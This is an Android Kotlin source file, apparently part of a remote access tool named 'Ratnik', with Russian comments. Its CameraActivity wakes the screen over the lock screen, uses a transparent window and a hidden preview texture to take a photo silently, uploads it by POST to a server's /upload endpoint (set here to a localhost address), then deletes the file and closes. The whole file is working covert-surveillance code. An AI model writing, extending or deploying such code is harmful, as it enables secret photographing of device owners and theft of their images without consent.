package com.ratnik.app

import android.app.Activity
import android.graphics.ImageFormat
import android.graphics.SurfaceTexture
import android.hardware.Camera
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.view.WindowManager
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.File
import java.io.FileOutputStream
import java.util.concurrent.TimeUnit

class CameraActivity : Activity() {
    private var camera: Camera? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        window.setBackgroundDrawableResource(android.R.color.transparent)

        // ПРИНУДИТЕЛЬНО БУДИМ ЭКРАН
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
            setShowWhenLocked(true)
            setTurnScreenOn(true)
        } else {
            @Suppress("DEPRECATION")
            window.addFlags(
                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
                WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
            )
        }
        window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)

        val client = OkHttpClient.Builder().connectTimeout(15, TimeUnit.SECONDS).build()
        val serverUrl = "http://127.0.0.1:8080" 

        // Ждем полсекунды, чтобы экран успел проснуться
        window.decorView.postDelayed({
            try {
                camera = Camera.open()
                val params = camera!!.parameters
                params.pictureFormat = ImageFormat.JPEG
                camera!!.parameters = params
                
                camera!!.setPreviewTexture(SurfaceTexture(0))
                camera!!.startPreview()
                
                camera!!.takePicture(null, null) { data, _ ->
                    try {
                        val file = File(cacheDir, "snap.jpg")
                        FileOutputStream(file).use { it.write(data) }
                        
                        val requestBody = file.asRequestBody("image/jpeg".toMediaTypeOrNull())
                        val multipartBody = MultipartBody.Builder()
                            .setType(MultipartBody.FORM)
                            .addFormDataPart("file", "snap.jpg", requestBody)
                            .build()
                            
                        val request = Request.Builder()
                            .url("$serverUrl/upload")
                            .post(multipartBody)
                            .build()
                            
                        client.newCall(request).execute().use { }
                        file.delete()
                    } catch (e: Exception) {
                        Log.e("RATNIK", "Ошибка отправки: ${e.message}")
                    } finally {
                        camera?.release()
                        finish()
                    }
                }
            } catch (e: Exception) {
                Log.e("RATNIK", "Ошибка камеры: ${e.message}")
                camera?.release()
                finish()
            }
        }, 500) // Задержка 500 мс
    }
}
